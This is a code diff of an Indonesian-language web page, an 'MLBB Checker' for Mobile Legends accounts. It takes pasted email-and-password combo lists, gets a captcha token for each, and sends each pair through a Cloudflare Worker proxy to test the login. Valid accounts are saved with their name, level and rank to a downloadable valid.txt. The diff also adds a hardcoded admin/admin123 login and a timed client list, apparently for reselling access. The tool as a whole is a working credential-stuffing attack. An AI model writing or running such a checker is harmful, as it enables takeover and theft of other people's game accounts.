@@ -1,188 +1,186 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>MLBB Checker Multi-Client by Arif Hidayatulloh</title>
+<meta charset="UTF-8" />
+<title>Admin Dashboard & MLBB Checker</title>
 <script src="https://cstaticdun.126.net/load.min.js"></script>
 <style>
-  body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; background: #121212; color: #eee; }
-  textarea, input { width: 100%; font-family: monospace; background: #1e1e1e; color: #eee; border: 1px solid #333; margin-bottom: 8px; }
-  button { padding: 10px 16px; cursor: pointer; margin-right: 8px; border: none; border-radius: 4px; }
+  body { font-family: Arial; max-width: 1000px; margin: auto; padding: 20px; background: #121212; color: #eee; }
+  input, select, button, textarea { font-size: 16px; margin: 4px 0; padding: 8px; border-radius: 4px; border: 1px solid #333; background: #1e1e1e; color: #eee; }
+  button { cursor: pointer; border: none; }
   button:hover { opacity: 0.9; }
-  #startBtn { background: #4caf50; color: white; }
-  #stopBtn { background: #f44336; color: white; }
-  #downloadBtn { background: #2196f3; color: white; }
+  #loginForm, #adminDashboard { max-width: 600px; margin: auto; }
+  #clientList div { margin-bottom: 8px; padding: 6px; border: 1px solid #333; border-radius: 4px; display:flex; justify-content:space-between; align-items:center; }
+  .timer { font-weight: bold; }
+  #captcha-root { margin: 12px 0; }
+  #log { background: #000; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; border: 1px solid #333; }
   .ok { color: #7CFC00; }
   .bad { color: #FF6B6B; }
   .info { color: #FFD866; }
-  .account-log { border: 1px solid #333; padding: 8px; margin-bottom: 4px; }
 </style>
 </head>
 <body>
 
-<h2>MLBB Multi-Client Checker by Arif Hidayatulloh</h2>
+<h1>MLBB Admin & Checker</h1>
 
-<h3>Generate Akun Client Baru</h3>
-<label>Jumlah akun:</label>
-<input type="number" id="genCount" value="5" min="1" max="50">
-<button id="genBtn">Generate</button>
-<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com|Pass456"></textarea>
+<!-- LOGIN -->
+<div id="loginForm">
+  <h2>Admin Login</h2>
+  <input type="text" id="username" placeholder="Username" required><br>
+  <input type="password" id="password" placeholder="Password" required><br>
+  <button id="loginBtn">Login</button>
+</div>
 
-<button id="startBtn">Start Checking</button>
-<button id="stopBtn" disabled>Stop</button>
-<button id="downloadBtn">Download valid.txt</button>
+<!-- DASHBOARD -->
+<div id="adminDashboard" style="display:none">
+  <h2>Admin Dashboard</h2>
+  <h3>Generate Akun Client</h3>
+  <input type="text" id="newUser" placeholder="Username client">
+  <input type="text" id="newPass" placeholder="Password client">
+  <input type="number" id="duration" placeholder="Durasi login (detik)" min="10" style="width:180px;">
+  <button id="addClientBtn">Tambah Akun</button>
 
-<div id="status"></div>
-<div id="captcha-root"></div>
-<h3>Log:</h3>
-<div id="log"></div>
+  <h3>Daftar Client</h3>
+  <div id="clientList"></div>
+
+  <h3>MLBB Checker</h3>
+  <textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com:Pass456"></textarea><br>
+  <button id="startBtn">Start Checking</button>
+  <button id="stopBtn" disabled>Stop</button>
+  <button id="downloadBtn">Download valid.txt</button>
+  <div id="status" style="margin-top:10px;"></div>
+
+  <div id="captcha-root"></div>
+  <h3>Log:</h3>
+  <div id="log"></div>
+</div>
 
 <script>
+/******** LOGIN ADMIN ********/
+const loginBtn = document.getElementById("loginBtn");
+loginBtn.addEventListener("click", function() {
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+  if(user === "admin" && pass === "admin123") {
+    alert("Login berhasil!");
+    document.getElementById("loginForm").style.display = "none";
+    document.getElementById("adminDashboard").style.display = "block";
+  } else {
+    alert("Username atau password salah!");
+  }
+});
+
+/******** MANAGE CLIENT ********/
+const addClientBtn = document.getElementById("addClientBtn");
+const clientListEl = document.getElementById("clientList");
+let clients = [];
+
+addClientBtn.addEventListener("click", function() {
+  const user = document.getElementById("newUser").value.trim();
+  const pass = document.getElementById("newPass").value.trim();
+  const duration = parseInt(document.getElementById("duration").value);
+
+  if(!user || !pass || !duration) return alert("Isi semua field!");
+  const expireAt = Date.now() + duration*1000;
+
+  const client = { username: user, password: pass, duration, expireAt };
+  clients.push(client);
+  renderClients();
+});
+
+function renderClients() {
+  clientListEl.innerHTML = "";
+  clients.forEach((c, idx) => {
+    const div = document.createElement("div");
+    div.innerHTML = `
+      <span>${c.username}:${c.password}</span>
+      <span class="timer" id="timer${idx}">${Math.max(0, Math.ceil((c.expireAt - Date.now())/1000))}s</span>
+      <button onclick="removeClient(${idx})">Hapus</button>
+    `;
+    clientListEl.appendChild(div);
+  });
+}
+
+function removeClient(idx) {
+  clients.splice(idx,1);
+  renderClients();
+}
+
+// Timer update tiap detik
+setInterval(() => {
+  clients.forEach((c, idx) => {
+    const t = Math.max(0, Math.ceil((c.expireAt - Date.now())/1000));
+    const el = document.getElementById("timer"+idx);
+    if(el) el.textContent = t + "s";
+  });
+}, 1000);
+
+/******** MLBB CHECKER ********/
 const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; 
-const WORKER_URL = "https://worker.bonar7527.workers.dev"; 
-
-let combos = [];
-let stopRequested = false;
-let neCaptchaInstance = null;
-let validResults = [];
-
+const WORKER_URL = "https://bebas.bonar7527.workers.dev"; // Ganti sesuai Worker
+let combos = [], currentIndex = 0, stopRequested = false, neCaptchaInstance = null, validResults = [];
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 const startBtn = document.getElementById("startBtn");
 const stopBtn = document.getElementById("stopBtn");
 const downloadBtn = document.getElementById("downloadBtn");
 const comboTextarea = document.getElementById("combo");
-const genBtn = document.getElementById("genBtn");
-const genCount = document.getElementById("genCount");
 
-function appendLog(text, cls) {
-  const div = document.createElement("div");
-  div.textContent = text;
-  if(cls) div.className = cls;
-  logEl.appendChild(div);
-  logEl.scrollTop = logEl.scrollHeight;
-}
+function appendLog(text, cls){ const div=document.createElement("div"); div.textContent=`[${new Date().toLocaleTimeString()}] ${text}`; if(cls) div.className=cls; logEl.appendChild(div); logEl.scrollTop=logEl.scrollHeight;}
 
-function parseCombos(text) {
-  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
-    let e,p;
-    if(line.includes("|")) [e,p]=line.split("|",2);
-    else if(line.includes(":")) [e,p]=line.split(":",2);
-    else { appendLog(`Format salah: ${line}`, "info"); return null; }
-    return { email:e.trim(), password:p.trim(), countdown:0 };
-  }).filter(Boolean);
-}
+function parseCombos(text){ return text.split(/\r?\n/).map(l=>l.trim()).filter(Boolean).map(line=>{ let e,p; if(line.includes("|")) [e,p]=line.split("|",2); else if(line.includes(":")) [e,p]=line.split(":",2); else {appendLog(`Format salah dilewati: ${line}`,"info"); return null;} return { email:e.trim(), password:p.trim()};}).filter(Boolean);}
 
-function generateAccounts(count){
-  const accounts = [];
-  for(let i=0;i<count;i++){
-    const user = `client${Date.now()}${Math.floor(Math.random()*1000)}@example.com`;
-    const pass = `Pass${Math.floor(Math.random()*10000)}`;
-    accounts.push(`${user}|${pass}`);
-  }
-  comboTextarea.value += accounts.join("\n") + "\n";
-}
+function showCaptchaOnce(){ return new Promise((resolve,reject)=>{ const root=document.getElementById("captcha-root"); root.innerHTML=""; if(!window.initNECaptcha){appendLog("initNECaptcha tidak tersedia","info"); reject("initNECaptcha missing"); return;} if(neCaptchaInstance && typeof neCaptchaInstance.destroy==="function") neCaptchaInstance.destroy(); try{ initNECaptcha({captchaId:CAPTCHA_ID,element:"#captcha-root",mode:"embed",width:"320px",onVerify(err,data){ if(err){ appendLog("Error verify captcha: "+JSON.stringify(err),"info"); reject(err); return;} if(!data||!data.validate){ appendLog("Token captcha kosong","info"); reject("no token"); return;} const token=data.validate; if(neCaptchaInstance && typeof neCaptchaInstance.destroy==="function") neCaptchaInstance.destroy(); resolve(token); },onLoad(instance){ neCaptchaInstance=instance; } }); }catch(e){ appendLog("Gagal inisialisasi captcha: "+e,"info"); reject(e);} });}
 
-genBtn.addEventListener("click", ()=>{
-  generateAccounts(parseInt(genCount.value));
-});
-
-function showCaptchaOnce() {
-  return new Promise((resolve,reject)=>{
-    const root = document.getElementById("captcha-root");
-    root.innerHTML="";
-    if(!window.initNECaptcha){ reject("initNECaptcha missing"); return; }
-    if(neCaptchaInstance && neCaptchaInstance.destroy) neCaptchaInstance.destroy();
-    try{
-      initNECaptcha({
-        captchaId: CAPTCHA_ID,
-        element: "#captcha-root",
-        mode: "embed",
-        width: "320px",
-        onVerify(err,data){
-          if(err || !data.validate){ reject(err||"no token"); return; }
-          if(neCaptchaInstance.destroy) neCaptchaInstance.destroy();
-          resolve(data.validate);
-        },
-        onLoad(instance){ neCaptchaInstance=instance; }
-      });
-    }catch(e){ reject(e); }
-  });
-}
-
-function startCountdown(accountDiv, duration){
-  let sec = duration;
-  accountDiv.textContent = `Login valid selama: ${sec}s`;
-  const interval = setInterval(()=>{
-    sec--;
-    if(sec>=0) accountDiv.textContent = `Login valid selama: ${sec}s`;
-    else clearInterval(interval);
-  },1000);
-}
-
-async function checkOneAccount(account) {
-  const accDiv = document.createElement("div");
-  accDiv.className="account-log info";
-  accDiv.textContent = `Minta captcha untuk ${account.email}`;
-  logEl.appendChild(accDiv);
-  statusEl.textContent=`Checking ${account.email}`;
+async function checkOneAccount(account){
+  appendLog(`Minta captcha untuk ${account.email}`,"info");
+  statusEl.textContent=`Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
   let token;
-  try { token = await showCaptchaOnce(); }
-  catch(e){ accDiv.textContent=`Captcha gagal untuk ${account.email}: ${e}`; accDiv.className="bad"; return; }
-
-  try {
-    const form = new URLSearchParams();
+  try{ token=await showCaptchaOnce(); }catch(e){ appendLog(`Captcha gagal ${account.email}: ${e}`,"bad"); return;}
+  appendLog(`Token captcha diterima`,"info");
+  try{
+    const form=new URLSearchParams();
     form.append("email",account.email);
     form.append("password",account.password);
     form.append("e_captcha",token);
-
-    const resp = await fetch(WORKER_URL+"/check",{ method:"POST", body:form });
-    const data = await resp.json();
-
+    const resp=await fetch(WORKER_URL+"/check",{method:"POST",body:form,headers:{"Content-Type":"application/x-www-form-urlencoded"}});
+    if(!resp.ok){ appendLog(`HTTP error ${resp.status} ${account.email}`,"bad"); return;}
+    const data=await resp.json();
     if(data.code===0 && data.data){
       const info=data.data;
-      const line=`${info.email}:${info.password} | Level:${info.level} | Rank:${info.rank_level}`;
-      accDiv.textContent=`VALID => ${line}`;
-      accDiv.className="ok";
+      const line=`${info.email}:${info.password} | Name:${info.name} | Level:${info.level} | Rank:${info.rank_level}`;
+      appendLog(`VALID => ${line}`,"ok");
       validResults.push(line);
-      startCountdown(accDiv,10);
-    } else if(data.code===1004) { accDiv.textContent=`[NOT FOUND] ${account.email}`; accDiv.className="bad"; }
-    else if(data.code===1005) { accDiv.textContent=`[WRONG PASS] ${account.email}`; accDiv.className="bad"; }
-    else { accDiv.textContent=`LAINNYA => ${account.email} | ${JSON.stringify(data)}`; accDiv.className="info"; }
-  } catch(e){ accDiv.textContent=`Error ${account.email}: ${e}`; accDiv.className="bad"; }
+    } else if(data.code===1004) appendLog(`[NOT FOUND] ${account.email}`,"bad");
+    else if(data.code===1005) appendLog(`[WRONG PASSWORD] ${account.email}`,"bad");
+    else appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`,"info");
+  } catch(e){ appendLog(`Error pengecekan ${account.email}: ${e}`,"bad"); }
 }
 
 async function startProcess(){
   stopRequested=false;
-  startBtn.disabled=true;
-  stopBtn.disabled=false;
-  logEl.innerHTML="";
-  validResults=[];
-  combos=parseCombos(comboTextarea.value);
-  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return; }
-
-  appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`,"info");
-
-  for(let i=0;i<combos.length;i++){
-    if(stopRequested){ appendLog("Proses dihentikan user","info"); break; }
-    await checkOneAccount(combos[i]);
+  startBtn.disabled=true; stopBtn.disabled=false;
+  logEl.innerHTML=""; validResults=[]; combos=parseCombos(comboTextarea.value);
+  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return;}
+  appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`,"info"); currentIndex=0;
+  while(currentIndex<combos.length){
+    if(stopRequested){ appendLog("Proses dihentikan user","info"); break;}
+    const acc=combos[currentIndex];
+    await checkOneAccount(acc);
+    combos.splice(currentIndex,1);
+    comboTextarea.value=combos.map(c=>`${c.email}:${c.password}`).join("\n");
   }
-
-  appendLog("Selesai","info");
-  statusEl.textContent="Selesai";
-  startBtn.disabled=false;
-  stopBtn.disabled=true;
+  appendLog("Selesai","info"); statusEl.textContent="Selesai";
+  startBtn.disabled=false; stopBtn.disabled=true;
 }
 
-startBtn.addEventListener("click",startProcess);
-stopBtn.addEventListener("click",()=>{ stopRequested=true; stopBtn.disabled=true; });
-downloadBtn.addEventListener("click",()=>{
-  if(validResults.length===0){ alert("Belum ada akun valid."); return; }
+startBtn.addEventListener("click", startProcess);
+stopBtn.addEventListener("click", ()=>{ stopRequested=true; stopBtn.disabled=true; });
+downloadBtn.addEventListener("click", ()=>{
+  if(validResults.length===0){ alert("Belum ada akun valid."); return;}
   const blob=new Blob([validResults.join("\n")],{type:"text/plain"});
-  const url=URL.createObjectURL(blob);
-  const a=document.createElement("a");
-  a.href=url; a.download="valid.txt"; a.click();
-  URL.revokeObjectURL(url);
+  const url=URL.createObjectURL(blob); const a=document.createElement("a");
+  a.href=url; a.download="valid.txt"; a.click(); URL.revokeObjectURL(url);
 });
 </script>
 </body>
